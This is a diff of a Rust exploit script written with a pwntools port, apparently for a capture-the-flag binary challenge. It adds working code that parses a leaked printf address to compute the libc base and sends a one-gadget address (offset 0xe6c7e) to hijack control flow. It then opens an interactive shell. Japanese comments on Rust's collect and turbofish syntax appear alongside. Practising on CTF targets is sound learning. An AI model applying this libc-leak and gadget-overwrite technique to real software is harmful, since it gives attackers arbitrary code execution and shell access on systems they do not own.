@@ -1,6 +1,7 @@
 use clap::Clap;
 use pwntools::util::P64;
 use pwntools::{process::Process, pwn::*};
+use std::convert::TryInto;
 use std::io;
 
 #[derive(Clap)]
@@ -64,12 +65,47 @@ fn main() -> io::Result<()> {
 
     s.sendline(&b"")?;
 
-    todo!("ここから recvline実装");
+    // todo!("ここから recvline実装");
 
-    println!("{:?}", elf.got("printf"));
-    println!("{:?}", elf.got("__isoc99_scanf"));
+    // --------------------------------
+    // x = s.recvline().split(b'\n')[0]
+    // while len(x) < 8:
+    //     x += b'\x00'
+    // printf_addr = unpack('Q', x)[0]
+    // print('printf: 0x%x' % printf_addr)
 
-    println!("{:?}", libc.symbol("printf"));
+    // https://doc.rust-lang.org/std/primitive.slice.html#method.strip_suffix
+
+    let mut x = s.recvline()?.strip_suffix(b"\n").unwrap().to_vec();
+    x.resize(8, b'\x00');
+    let printf_addr = u64::from_le_bytes(x.try_into().unwrap());
+    println!("{:?}", printf_addr);
+
+    const LIBC_GADGET_OFFSET: u64 = 0xe6c7e;
+    // const LIBC_GADGET_OFFSET: u64 = 0x4f432;
+    let libc_base_addr = printf_addr - libc.symbol("printf").unwrap();
+    let gadget_addr = libc_base_addr + LIBC_GADGET_OFFSET;
+
+    s.send(&P64(0))?;
+    s.send(&P64(gadget_addr))?;
+    s.sendline(&b"")?;
+    s.interactive()?;
+
+    // collectはFromIteratorを実装している任意の型 (通常はコンテナっぽい型) に変換できる
+    // VecにしたいのかHashMapにしたいのかHashSetにしたいのかBTreeMapにしたいのかコンパイラは知らないので
+    // collectするときはだいたいtype annotationが必要 (もっと型推論頑張ってくれ)
+    // type annotationのしかたとしては
+    // let foo: Vec<_> = (...).collect(); みたいに束縛に書く方法と
+    // (...).collect::<Vec<_>>() みたいに書く方法がある (turbofish構文)
+    // 後者だと (...).collect::<Vec<_>>().(...) みたいなmethod chainの途中で使える
+    // 僕は型推論が上手くいくことを祈って、ダメならturbofishしてます
+
+    // --------------------------------
+
+    // println!("{:?}", elf.got("printf"));
+    // println!("{:?}", elf.got("__isoc99_scanf"));
+
+    // println!("{:?}", libc.symbol("printf"));
 
     Ok(())
 }
